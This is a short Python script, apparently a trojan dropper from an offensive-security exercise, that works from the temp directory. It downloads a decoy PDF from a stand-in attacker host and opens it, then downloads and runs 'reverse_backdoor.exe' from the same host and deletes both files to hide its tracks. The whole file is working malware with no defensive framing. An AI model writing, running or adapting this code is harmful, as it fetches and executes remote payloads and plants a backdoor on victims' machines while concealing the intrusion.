#!/usr/bin/env python
import requests, subprocess, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]

    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)



temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://attacker.address/evil-files/sample.pdf")
subprocess.Popen("sample.pdf", shell=True)

download("http://attacker.address/evil-files/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True)

os.remove("sample.pdf")
os.remove("reverse_backdoor.exe") 
